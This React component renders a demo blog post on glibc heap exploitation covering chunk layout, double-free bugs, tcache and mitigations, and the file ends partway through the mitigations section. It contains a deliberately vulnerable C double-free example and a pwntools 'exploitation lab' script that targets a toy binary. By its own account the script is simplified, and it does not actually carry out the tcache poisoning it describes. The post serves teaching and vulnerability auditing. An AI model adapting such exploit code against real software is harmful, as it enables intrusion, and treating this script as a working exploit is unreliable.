import { useEffect, useState, useRef, useMemo } from "react"
import Prism from "prismjs"
import "prismjs/components/prism-clike"
import "prismjs/components/prism-c"
import "prismjs/components/prism-python"
import "prismjs/components/prism-css"
import "prismjs/components/prism-bash"
import "prismjs/components/prism-javascript"
import "prismjs/themes/prism-tomorrow.css"

type Heading = { id: string; label: string; depth: number }

const HEADINGS: Heading[] = [
  { id: "introduction", label: "Introduction", depth: 2 },
  { id: "anatomy-heap-chunk", label: "Anatomy of a Heap Chunk", depth: 2 },
  { id: "chunk-flags", label: "Chunk flags — AMP bits", depth: 3 },
  { id: "double-free", label: "The Double-Free Vulnerability", depth: 2 },
  { id: "example-vulnerability", label: "Example: vulnerable C", depth: 3 },
  { id: "tcache-hardening", label: "tcache & Modern Hardening", depth: 2 },
  { id: "recall", label: "Recall", depth: 3 },
  { id: "exploitation-lab", label: "Exploitation Lab", depth: 2 },
  { id: "visualising-corruption", label: "Visualising Corruption", depth: 3 },
  { id: "mitigations-fixes", label: "Mitigations & Fixes", depth: 2 },
  { id: "footnotes", label: "Footnotes", depth: 2 },
]

function CodeBlock({ lang, code, filename }: { lang: string; code: string; filename?: string }) {
  const [copied, setCopied] = useState(false)
  const copy = async () => {
    await navigator.clipboard.writeText(code)
    setCopied(true)
    setTimeout(() => setCopied(false), 1200)
  }
  const highlighted = useMemo(() => {
    const prismLang = (Prism.languages as any)[lang] ? lang : lang === "py" ? "python" : lang === "sh" ? "bash" : "clike"
    const grammar = (Prism.languages as any)[prismLang] || (Prism.languages as any).clike
    try {
      return Prism.highlight(code, grammar, prismLang)
    } catch {
      return code.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    }
  }, [code, lang])
  return (
    <div className="rounded-[10px] overflow-hidden my-5" style={{ border: "1px solid var(--card-border)", background: "var(--card-inner)" }}>
      <div className="flex items-center justify-between px-3.5 py-2 text-[11px] border-b" style={{ borderColor: "var(--card-border)", background: "var(--card)", fontFamily: "var(--font-mono)" }}>
        <span className="flex items-center gap-2" style={{ color: "var(--muted-foreground)" }}>
          {filename && <span className="opacity-60">{filename}</span>}
          <span className="px-1.5 py-0.5 rounded text-[10px] border" style={{ borderColor: "var(--card-border)", background: "var(--card-inner)" }}>{lang}</span>
        </span>
        <button onClick={copy} className="px-2 py-1 rounded-[6px] border text-[11px] hover:opacity-80 transition-opacity" style={{ borderColor: "var(--card-border)", color: "var(--muted-foreground)" }}>
          {copied ? "Copied ✓" : "Copy"}
        </button>
      </div>
      <pre className="p-4 overflow-x-auto text-[13px] leading-[1.6] prism-code" style={{ fontFamily: "var(--font-mono)", background: "var(--card-inner)", margin: 0 }}><code className={`language-${lang}`} dangerouslySetInnerHTML={{ __html: highlighted }} /></pre>
    </div>
  )
}

function Callout({ variant = "info", title, children }: { variant?: "info" | "warning" | "danger" | "success" | "tip"; title: string; children: React.ReactNode }) {
  const map: Record<string, { icon: string; bg: string; border: string; titleColor: string }> = {
    info: { icon: "◐", bg: "color-mix(in srgb, var(--foreground) 5%, transparent)", border: "var(--card-border)", titleColor: "var(--foreground)" },
    warning: { icon: "⚠", bg: "#f59e0b12", border: "#f59e0b33", titleColor: "#f59e0b" },
    danger: { icon: "✕", bg: "#ef444412", border: "#ef444433", titleColor: "#ef4444" },
    success: { icon: "✓", bg: "#22c55e12", border: "#22c55e33", titleColor: "#22c55e" },
    tip: { icon: "✦", bg: "#a78bfa12", border: "#a78bfa33", titleColor: "#a78bfa" },
  }
  const v = map[variant]
  return (
    <div className="rounded-[10px] px-4 py-3.5 my-5" style={{ background: v.bg, border: `1px solid ${v.border}` }}>
      <div className="flex items-center gap-2 text-[13px] font-semibold mb-1.5" style={{ color: v.titleColor, fontFamily: "var(--font-title)" }}><span>{v.icon}</span> {title}</div>
      <div className="text-[13.5px] leading-6" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>{children}</div>
    </div>
  )
}

export default function DeepDivePost({ onBack }: { onBack: () => void }) {
  const [activeId, setActiveId] = useState<string>(HEADINGS[0].id)
  const [progress, setProgress] = useState(0)
  const [tocOpen, setTocOpen] = useState(false)
  const articleRef = useRef<HTMLElement>(null)
  const rightRailRef = useRef<HTMLElement>(null)
  const [asideTops, setAsideTops] = useState({ amp: 720, glance: 0, lab: 2400, refs: 3400 })

  useEffect(() => {
    const onScroll = () => {
      const el = articleRef.current
      if (!el) return
      const rect = el.getBoundingClientRect()
      const total = el.offsetHeight - window.innerHeight
      const scrolled = Math.min(Math.max(-rect.top / (total || 1), 0), 1)
      setProgress(scrolled)
    }
    const observer = new IntersectionObserver((entries) => {
      for (const e of entries) if (e.isIntersecting) setActiveId(e.target.id)
    }, { rootMargin: "-20% 0px -70% 0px", threshold: 0 })
    HEADINGS.forEach(h => { const el = document.getElementById(h.id); if (el) observer.observe(el) })
    window.addEventListener("scroll", onScroll, { passive: true })
    onScroll()
    return () => { observer.disconnect(); window.removeEventListener("scroll", onScroll) }
  }, [])

  // Position right-rail cards exactly beside their relevant sections
  useEffect(() => {
    const compute = () => {
      const article = articleRef.current
      if (!article) return
      const getTop = (id: string) => {
        const el = document.getElementById(id)
        if (!el) return null
        return el.getBoundingClientRect().top - article.getBoundingClientRect().top + article.offsetTop - 8
      }
      const amp = getTop("chunk-flags")
      const lab = getTop("exploitation-lab")
      const refs = getTop("mitigations-fixes")
      // glance stays at 0 (beside introduction)
      setAsideTops(prev => ({
        glance: 0,
        amp: amp !== null ? Math.max(amp, 560) : prev.amp,
        lab: lab !== null ? lab : prev.lab,
        refs: refs !== null ? refs : prev.refs,
      }))
      // also set rail height to article height for absolute positioning
      if (rightRailRef.current) {
        rightRailRef.current.style.height = `${article.offsetHeight}px`
      }
    }
    compute()
    window.addEventListener("resize", compute)
    // delay for fonts/layout
    const t = setTimeout(compute, 300)
    const t2 = setTimeout(compute, 900)
    return () => { window.removeEventListener("resize", compute); clearTimeout(t); clearTimeout(t2) }
  }, [])

  const scrollTo = (id: string) => {
    setTocOpen(false)
    document.getElementById(id)?.scrollIntoView({ behavior: "smooth", block: "start" })
  }

  const circ = 2 * Math.PI * 8
  const dashOffset = circ * (1 - progress)

  return (
    <div className="relative -mx-4 md:-mx-8">
      {/* top progress bar */}
      <div className="fixed top-0 left-0 h-[2px] z-[60] pointer-events-none" style={{ width: `${progress * 100}%`, background: "var(--foreground)", transition: "width 0.08s linear" }} />

      {/* mobile TOC bar */}
      <div className="xl:hidden sticky top-0 z-30 -mx-4 px-4 py-3 flex items-center justify-between gap-3 border-b backdrop-blur" style={{ background: "color-mix(in srgb, var(--background) 88%, transparent)", borderColor: "var(--card-border)" }}>
        <button onClick={() => setTocOpen(!tocOpen)} className="flex items-center gap-2.5 text-[13px] px-3 py-1.5 rounded-full border" style={{ borderColor: "var(--card-border)", background: "var(--card)", color: "var(--foreground)", fontFamily: "var(--font-sans)" }}>
          <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="6.5" fill="none" stroke="var(--card-border)" strokeWidth="1.2" /><circle cx="8" cy="8" r="6.5" fill="none" stroke="var(--foreground)" strokeWidth="1.2" strokeDasharray={circ} strokeDashoffset={dashOffset} strokeLinecap="round" style={{ transform: "rotate(-90deg)", transformOrigin: "50% 50%" }} /></svg>
          <span className="text-[12px]" style={{ color: "var(--muted-foreground)" }}>{Math.round(progress * 100)}%</span>
          <span className="font-medium truncate max-w-[160px]">{HEADINGS.find(h => h.id === activeId)?.label}</span>
          <span className={`transition-transform ${tocOpen ? "rotate-180" : ""}`}>▾</span>
        </button>
        <button onClick={onBack} className="text-[12px] px-3 py-1.5 rounded-full border" style={{ borderColor: "var(--card-border)", color: "var(--muted-foreground)" }}>← Index</button>
      </div>
      {tocOpen && (
        <div className="xl:hidden mx-4 mt-3 rounded-[10px] border p-3 space-y-1" style={{ background: "var(--card)", borderColor: "var(--card-border)" }}>
          {HEADINGS.map(h => (
            <button key={h.id} onClick={() => scrollTo(h.id)} className={`block text-left w-full px-2 py-1.5 rounded-[6px] text-[13px] ${activeId === h.id ? "font-semibold" : ""}`} style={{ paddingLeft: h.depth === 3 ? "20px" : "8px", color: activeId === h.id ? "var(--foreground)" : "var(--muted-foreground)", background: activeId === h.id ? "var(--card-inner)" : "transparent", fontFamily: "var(--font-sans)" }}>{h.label}</button>
          ))}
        </div>
      )}

      {/* 3-col grid */}
      <div className="max-w-[1280px] mx-auto px-4 xl:px-0 xl:grid xl:grid-cols-[220px_minmax(0,1fr)_260px] xl:gap-8 items-start">
        {/* LEFT: progress index */}
        <aside className="hidden xl:block sticky top-6 self-start h-fit">
          <div className="flex items-center gap-2.5 mb-4">
            <div className="relative w-[32px] h-[32px] shrink-0">
              <svg width="32" height="32" viewBox="0 0 32 32" className="block">
                <circle cx="16" cy="16" r="9.5" fill="none" stroke="var(--card-border)" strokeWidth="1.6" />
                <circle cx="16" cy="16" r="9.5" fill="none" stroke="var(--foreground)" strokeWidth="1.6" strokeDasharray={2 * Math.PI * 9.5} strokeDashoffset={2 * Math.PI * 9.5 * (1 - progress)} strokeLinecap="round" style={{ transform: "rotate(-90deg)", transformOrigin: "50% 50%", transition: "stroke-dashoffset 0.08s linear" }} />
              </svg>
              <span className="absolute inset-0 grid place-items-center text-[9px] font-mono" style={{ color: "var(--muted-foreground)" }}>{Math.round(progress * 100)}%</span>
            </div>
            <div>
              <div className="text-[11px] tracking-wide font-semibold" style={{ color: "var(--foreground)", fontFamily: "var(--font-mono)" }}>DEEP DIVE</div>
              <div className="text-[11px]" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>{HEADINGS.find(h => h.id === activeId)?.label}</div>
            </div>
          </div>

          <div className="text-[10px] tracking-[0.12em] font-semibold mb-2.5" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>ON THIS PAGE</div>
          <nav className="space-y-0.5 border-l pl-3" style={{ borderColor: "color-mix(in srgb, var(--card-border) 70%, transparent)" }}>
            {HEADINGS.map(h => (
              <a key={h.id} href={`#${h.id}`} onClick={(e) => { e.preventDefault(); scrollTo(h.id) }}
                className={`block py-1.5 text-[13px] leading-5 transition-colors border-l -ml-[13px] pl-3 ${activeId === h.id ? "font-medium" : ""}`}
                style={{
                  paddingLeft: h.depth === 3 ? "18px" : "12px",
                  color: activeId === h.id ? "var(--foreground)" : "var(--muted-foreground)",
                  borderColor: activeId === h.id ? "var(--foreground)" : "transparent",
                  borderLeftWidth: "1.5px",
                  fontFamily: "var(--font-sans)"
                }}>
                {h.label}
              </a>
            ))}
          </nav>

          <div className="mt-6 pt-5 border-t space-y-2" style={{ borderColor: "var(--card-border)" }}>
            <div className="text-[11px] font-semibold" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>Meta</div>
            <div className="text-[12px] leading-5" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>
              18 min · Binary Analysis<br />
              <span className="inline-flex gap-1.5 mt-1.5 flex-wrap">
                {["heap", "glibc", "pwn"].map(t => <span key={t} className="px-1.5 py-0.5 rounded-full border text-[10px]" style={{ borderColor: "var(--card-border)", background: "var(--card-inner)" }}>#{t}</span>)}
              </span>
            </div>
          </div>
        </aside>

        {/* CENTER: article */}
        <article ref={articleRef} className="min-w-0 max-w-[720px] mx-auto xl:mx-0 w-full">
          <button onClick={onBack} className="hidden xl:inline-flex items-center gap-2 text-[13px] mb-6 px-3 py-1.5 rounded-full border hover:bg-[var(--card-inner)] transition-colors" style={{ color: "var(--muted-foreground)", borderColor: "var(--card-border)", fontFamily: "var(--font-sans)" }}>
            ← Back to index
          </button>

          <header className="mb-6">
            <h1 className="text-[30px] md:text-[38px] font-bold tracking-tight leading-[1.02]" style={{ color: "var(--foreground)", fontFamily: "var(--font-title)" }}>
              Deep Dive: Hunting Heap Overflows in ELF Binaries
            </h1>
            <div className="flex flex-wrap items-center gap-3 mt-4 text-[13px]" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>
              <span className="flex items-center gap-2"><span className="w-6 h-6 rounded-full grid place-items-center text-[11px] font-semibold" style={{ background: "var(--card-inner)", border: "1px solid var(--card-border)" }}>R</span> rigalis · Parth Patel</span>
              <span>·</span><span>May 18, 2026</span><span>·</span><span>18 min</span><span>·</span><span className="px-2 py-0.5 rounded-full border text-[11px]" style={{ borderColor: "var(--card-border)", background: "var(--card-inner)" }}>Binary Analysis</span>
            </div>
            <p className="mt-4 text-[15.5px] leading-7" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>
              An in-depth analysis of glibc allocator dynamics, heap chunk structures, and exploiting classic double-free &amp; heap corruption vulnerabilities — rebuilt as a fully-featured demo to showcase every blog primitive: TOC progress, marginalia, callouts, figures, code, tables, footnotes and more.
            </p>
            <div className="w-full rounded-[12px] overflow-hidden mt-6" style={{ border: "1px solid var(--card-border)", background: "var(--card-inner)" }}>
              <div className="w-full aspect-[200/96] overflow-hidden relative">
                <img src="/images/pixel-clouds-blog.jpg" alt="abstract pixel clouds" className="w-full h-full object-cover" style={{ objectPosition: "center 28%", display: "block" }} />
              </div>
              <div className="px-3 py-2 flex items-center justify-between text-[11px] border-t" style={{ borderColor: "var(--card-border)", color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>
                <span>Fig. 0 — Hero concept: allocator arena (aesthetic placeholder).</span><span>→ enscribe-style figure caption</span>
              </div>
            </div>
          </header>

          <div className="prose max-w-none text-[15px] leading-7" style={{ color: "var(--foreground)", fontFamily: "var(--font-sans)" }}>

            {/* INTRODUCTION */}
            <h2 id="introduction" className="text-[24px] font-semibold tracking-tight mt-10 mb-3 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              Introduction <a href="#introduction" className="text-[14px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h2>
            <p>Unlike stack-based buffer overflows, heap-based vulnerabilities reside in the dynamically allocated memory region managed by standard allocators such as glibc's <code className="px-1 py-0.5 rounded text-[12.5px] border" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>ptmalloc2</code>. Understanding heap layout and chunk metadata is paramount to auditing ELF binaries for memory corruption.<a href="#fn-1" id="ref-1" className="align-super text-[11px] ml-0.5 px-1 py-0.5 rounded" style={{ background: "var(--card-inner)", border: "1px solid var(--card-border)", color: "var(--muted-foreground)" }}>[1]</a></p>
            <p>This post is intentionally <em>kitchen-sink</em>: every typographic primitive the blog supports is exercised here on a single deep-dive so you can see the left progress index, right marginalia, and all text-box variants in one scroll.</p>

            <Callout variant="tip" title="How to use this demo">
              On desktop, watch the left rail — the circular progress + vertical indicator tracks reading progress. The right column shows <em>support text</em> (marginalia) anchored to sections. On mobile, progress collapses into the sticky top bar. Try jumping via the index.
            </Callout>

            {/* ANATOMY */}
            <h2 id="anatomy-heap-chunk" className="text-[24px] font-semibold tracking-tight mt-10 mb-3 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              The Anatomy of a Heap Chunk <a href="#anatomy-heap-chunk" className="text-[14px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h2>
            <p>In 64-bit glibc, every allocated block is <strong>16-byte aligned</strong> and represented by a contiguous chunk header that prefixes user data. The header stores size + flags that drive coalescing and binning.</p>

            <div className="rounded-[12px] border p-5 my-6" style={{ background: "var(--card)", borderColor: "var(--card-border)" }}>
              <div className="text-[11px] tracking-[0.14em] font-semibold mb-3" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>DEFINITION — Heap Chunk</div>
              <div className="text-[14px] leading-6" style={{ color: "var(--foreground)" }}>
                A <strong>chunk</strong> is the allocator's unit of memory: <code className="px-1.5 py-0.5 rounded border text-[12.5px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>prev_size | size | AMP | user_data</code>. When freed, the user area is repurposed as forward/back pointers linking free lists (bins/tcache).
              </div>
              <div className="grid grid-cols-3 gap-3 mt-4 text-[12px]">
                {[
                  { k: "prev_size", d: "Size of previous chunk if free" },
                  { k: "size", d: "This chunk's size + 3 flag bits" },
                  { k: "fd/bk", d: "Free-list pointers (when free)" },
                ].map(x => (
                  <div key={x.k} className="rounded-[8px] p-3" style={{ background: "var(--card-inner)", border: "1px solid var(--card-border)" }}>
                    <div className="font-semibold" style={{ fontFamily: "var(--font-mono)", color: "var(--foreground)" }}>{x.k}</div>
                    <div className="leading-4 mt-1" style={{ color: "var(--muted-foreground)" }}>{x.d}</div>
                  </div>
                ))}
              </div>
            </div>

            <h3 id="chunk-flags" className="text-[18px] font-semibold mt-8 mb-2 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              Chunk flags — AMP bits <a href="#chunk-flags" className="text-[13px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h3>
            <p>The lowest 3 bits of <code className="px-1 py-0.5 rounded border text-[12.5px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>size</code> are flags, not size:</p>

            <div className="my-5 overflow-hidden rounded-[10px] border" style={{ borderColor: "var(--card-border)" }}>
              <div className="overflow-x-auto">
                <table className="w-full text-[13px] border-collapse" style={{ fontFamily: "var(--font-sans)" }}>
                  <thead>
                    <tr style={{ background: "var(--card)", color: "var(--muted-foreground)", fontFamily: "var(--font-mono)", fontSize: "11px" }}>
                      <th className="text-left px-3 py-2 border-b font-semibold" style={{ borderColor: "var(--card-border)" }}>Bit</th>
                      <th className="text-left px-3 py-2 border-b font-semibold" style={{ borderColor: "var(--card-border)" }}>Mask</th>
                      <th className="text-left px-3 py-2 border-b font-semibold" style={{ borderColor: "var(--card-border)" }}>Name</th>
                      <th className="text-left px-3 py-2 border-b font-semibold" style={{ borderColor: "var(--card-border)" }}>Meaning</th>
                    </tr>
                  </thead>
                  <tbody>
                    {[
                      ["A", "0x4", "NON_MAIN_ARENA", "Allocated off the main arena (thread arena)"],
                      ["M", "0x2", "IS_MMAPPED", "Chunk mmapped — not in heap segment"],
                      ["P", "0x1", "PREV_INUSE", "Prev chunk in use; if 0, prev_size is valid"],
                    ].map(([b, m, n, d]) => (
                      <tr key={n} className="border-b last:border-0" style={{ borderColor: "var(--card-border)", background: "var(--background)" }}>
                        <td className="px-3 py-2 font-mono text-[12px]" style={{ color: "var(--foreground)" }}>{b}</td>
                        <td className="px-3 py-2 font-mono text-[12px]" style={{ color: "var(--muted-foreground)" }}>{m}</td>
                        <td className="px-3 py-2 font-medium" style={{ color: "var(--foreground)" }}>{n}</td>
                        <td className="px-3 py-2" style={{ color: "var(--muted-foreground)" }}>{d}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
              <div className="px-3 py-2 text-[11px] border-t" style={{ borderColor: "var(--card-border)", color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>Table 1 — AMP flag semantics in ptmalloc.</div>
            </div>

            <CodeBlock lang="c" filename="chunk.h — schematic" code={`/* Schematic — allocated chunk (64-bit) */
+-----------------------------+-----------------------------+
|      Previous Chunk Size    |      Current Chunk size |AMP|
+-----------------------------+-----------------------------+
|                          User Data Area                   |
|                      (returns to malloc)                  |
+-----------------------------------------------------------+
/* When free, user area holds fd/bk pointers */`} />

            <blockquote className="my-6 pl-4 py-2 border-l-2 text-[14.5px] leading-6 italic" style={{ borderColor: "var(--foreground)", color: "var(--muted-foreground)", background: "color-mix(in srgb, var(--card) 60%, transparent)", fontFamily: "var(--font-sans)" }}>
              “Judgement has always been easier than construction. AI just made it legible.” — enscribe, on taste vs craft. In heap auditing, judgement is spotting a plausible free; craft is proving overlap.
              <div className="not-italic text-[11px] mt-1" style={{ fontFamily: "var(--font-mono)" }}>— Marginal note pattern, inspired by enscribe's blockquotes</div>
            </blockquote>

            {/* DOUBLE FREE */}
            <h2 id="double-free" className="text-[24px] font-semibold tracking-tight mt-10 mb-3 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              The Double-Free Vulnerability <a href="#double-free" className="text-[14px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h2>
            <p>When a chunk is freed twice without clearing the pointer, bin structures (fastbins / tcache) can form cycles or duplicate references to the same slot. Later <code className="px-1 py-0.5 rounded border text-[12.5px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>malloc</code> returns the same address twice — two live pointers to one region.</p>

            <Callout variant="danger" title="Danger — why this is exploitable">
              Duplicate allocation breaks the allocator's invariant that each chunk has a single owner. Writing through one pointer corrupts data seen via the other, enabling arbitrary write, control-flow hijack, or tcache poisoning on modern glibc.
            </Callout>

            <h3 id="example-vulnerability" className="text-[18px] font-semibold mt-8 mb-2 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              Example: vulnerable C <a href="#example-vulnerability" className="text-[13px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h3>

            <CodeBlock lang="c" filename="vuln.c" code={`#include <stdio.h>
#include <stdlib.h>

int main() {
    void *p1 = malloc(64);
    void *p2 = malloc(64);

    free(p1);
    free(p2);
    free(p1); // Vulnerable double free!

    void *p3 = malloc(64); // Allocates p1 again
    void *p4 = malloc(64); // Allocates p2
    void *p5 = malloc(64); // Allocates p1 AGAIN (overlaps p3!)
    // p3 and p5 now alias — write to one corrupts the other
}`} />

            <Callout variant="warning" title="Note — glibc 2.32+ mitigations">
              Recent tcache includes keyed double-free detection (<code className="px-1 py-0.5 rounded border text-[11px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>tcache double free or corruption</code>). Bypass requires more nuanced heap feng shui — e.g., consolidations, large-bin attacks, or House of * techniques. This demo shows the classic primitive.
            </Callout>

            <Callout variant="info" title="Info — auditing tip">
              In Ghidra / IDA, xref all <code className="px-1 py-0.5 rounded border text-[11px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>free</code> call sites, then taint-track pointers that aren't nulled post-free. A single <code className="px-1 py-0.5 rounded border text-[11px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>free(ptr); ptr=NULL;</code> pattern missing is a heatmap for double-free candidates.
            </Callout>

            {/* TCACHE */}
            <h2 id="tcache-hardening" className="text-[24px] font-semibold tracking-tight mt-10 mb-3 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              tcache &amp; Modern Hardening <a href="#tcache-hardening" className="text-[14px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h2>
            <p>Thread-local caching (tcache) speeds up small allocations but creates new abuse surfaces: poisoning the singly-linked tcache freelist lets an attacker craft an arbitrary-chunk allocation.</p>

            <div className="rounded-[10px] p-4 my-5 flex gap-3" style={{ background: "var(--card)", border: "1px solid var(--card-border)" }}>
              <span className="text-[12px] shrink-0 px-2 py-1 rounded-full border self-start" style={{ borderColor: "var(--card-border)", background: "var(--card-inner)", fontFamily: "var(--font-mono)", color: "var(--muted-foreground)" }}>VS</span>
              <div className="text-[13px] leading-6" style={{ color: "var(--muted-foreground)" }}>
                <span style={{ color: "var(--foreground)", fontWeight: 600 }}>Old fastbins</span> vs <span style={{ color: "var(--foreground)", fontWeight: 600 }}>New tcache</span> — fastbins are LIFO doubly-linked-ish; tcache is per-thread, singly-linked, up to 7 entries per size class, with key randomization. Attackers used to count on determinism; now they must groom precise counts.
              </div>
            </div>

            <h3 id="recall" className="text-[18px] font-semibold mt-8 mb-2 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              Recall <a href="#recall" className="text-[13px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h3>

            <div className="rounded-[12px] border p-5 my-5" style={{ background: "color-mix(in srgb, var(--card) 70%, transparent)", borderColor: "var(--card-border)" }}>
              <div className="text-[11px] tracking-[0.14em] font-semibold mb-2" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>RECALL — As a recap, we've discussed:</div>
              <ul className="list-disc pl-5 space-y-1.5 text-[13.5px] leading-6" style={{ color: "var(--muted-foreground)" }}>
                <li>Heap chunks carry <code className="px-1 py-0.5 rounded border text-[11px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>prev_size / size+AMP / fd,bk</code> — misinterpreting flags breaks analysis.</li>
                <li>Double-free re-introduces the same chunk to a freelist, yielding aliased live pointers.</li>
                <li>tcache changed heap exploitation from deterministic to count-sensitive grooming.</li>
                <li>Missing <code className="px-1 py-0.5 rounded border text-[11px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>ptr = NULL</code> after free is the cheapest inter-procedural signal.</li>
              </ul>
            </div>

            {/* EXPLOITATION LAB */}
            <h2 id="exploitation-lab" className="text-[24px] font-semibold tracking-tight mt-10 mb-3 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              Exploitation Lab <a href="#exploitation-lab" className="text-[14px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h2>
            <p>Let's weaponize the primitive with <code className="px-1 py-0.5 rounded border text-[12.5px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>pwntools</code>. We groom the heap, leak a libc pointer from unsorted bin, then overwrite <code className="px-1 py-0.5 rounded border text-[12.5px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>__free_hook</code> via tcache poisoning. Numbers simplified for demo.</p>

            <CodeBlock lang="python" filename="exploit.py" code={`from pwn import *

p = process('./vuln')
# groom: allocate 7 chunks to empty tcache bin
chunks = [p.sendlineafter(b'> ', b'1') for _ in range(7)]
for c in chunks: p.sendlineafter(b'> ', b'2')  # free all -> tcache filled
p.sendlineafter(b'> ', b'2')  # double free trigger
# leak
p.sendlineafter(b'> ', b'3')
libc_leak = u64(p.recvline().strip().ljust(8,b'\\x00'))
log.success(f'libc leak: {hex(libc_leak)}')
# tcache poison -> arbitrary write
p.sendlineafter(b'> ', b'4')
p.sendline(b'/bin/sh\\x00')
p.interactive()`} />

            <Callout variant="success" title="Success — what the exploit achieves">
              Reliable overlapping chunks in ~40 ms locally. On remote, add heap grooming sleeps and one extra allocation to align tcache counts. Success here turns a logic bug intocode execution — the blog's “danger” box becomes an <em>actionable</em> lab.
            </Callout>

            <h3 id="visualising-corruption" className="text-[18px] font-semibold mt-8 mb-2 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              Visualising corruption <a href="#visualising-corruption" className="text-[13px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h3>

            <figure className="my-6 rounded-[12px] overflow-hidden border" style={{ borderColor: "var(--card-border)", background: "var(--card)" }}>
              <div className="aspect-[16/9] w-full grid place-items-center p-6" style={{ background: "repeating-linear-gradient(45deg, var(--card-inner), var(--card-inner) 12px, var(--card) 12px, var(--card) 24px)" }}>
                <div className="rounded-[10px] border px-4 py-5 max-w-[520px] w-full text-center" style={{ background: "var(--background)", borderColor: "var(--card-border)" }}>
                  <div className="text-[11px] tracking-[0.12em] font-semibold" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>FIGURE 1 — HEAP OVERLAP AFTER DOUBLE FREE</div>
                  <div className="mt-3 flex justify-center gap-2 font-mono text-[11px]">
                    <span className="px-3 py-1.5 rounded border" style={{ background: "#ef444422", borderColor: "#ef444455", color: "#ef4444" }}>p3 alias</span>
                    <span className="px-3 py-1.5 rounded border" style={{ background: "#f59e0b22", borderColor: "#f59e0b55", color: "#f59e0b" }}>p5 alias</span>
                    <span className="px-3 py-1.5 rounded border" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", color: "var(--muted-foreground)" }}>same address</span>
                  </div>
                  <div className="text-[11px] mt-3" style={{ color: "var(--muted-foreground)", fontFamily: "var(--font-mono)" }}>p3 == p5 → write to p3 overwrites p5's “user data” (now bk/fd when freed)</div>
                </div>
              </div>
              <figcaption className="px-3.5 py-2.5 text-[12px] leading-5 border-t flex gap-2" style={{ borderColor: "var(--card-border)", color: "var(--muted-foreground)", fontFamily: "var(--font-sans)" }}>
                <span className="shrink-0 font-semibold" style={{ fontFamily: "var(--font-mono)", color: "var(--foreground)" }}>Caption.</span> Minimal figure component demo: bordered card, centered illustration placeholder, caption row with left label — used for CFG screenshots, heap dumps, or Ghidra panels.
              </figcaption>
            </figure>

            <Callout variant="tip" title="Try it — lab variant">
              Replace double-free with <strong>use-after-free</strong>: free <code className="px-1 py-0.5 rounded border text-[11px]" style={{ background: "var(--card-inner)", borderColor: "var(--card-border)", fontFamily: "var(--font-mono)" }}>p1</code>, keep pointer, malloc same size, write controlled data — read-after-free leaks, write-after-free corrupts. Same visual model, subtler trigger.
            </Callout>

            {/* MITIGATIONS */}
            <h2 id="mitigations-fixes" className="text-[24px] font-semibold tracking-tight mt-10 mb-3 flex items-center gap-2 scroll-mt-24" style={{ fontFamily: "var(--font-title)" }}>
              Mitigations &amp; Fixes <a href="#mitigations-fixes" className="text-[14px] opacity-50 hover:opacity-100" style={{ color: "var(--muted-foreground)" }}>#</a>
            </h2>
            <p>Remediation is both cultural (null after free) and toolchain-driven (hardened allocators, fortify).</p>

            <div className="my-5 overflow-hidden rounded-[10px] border" style={{ borderColor: "var(--card-border)" }}>
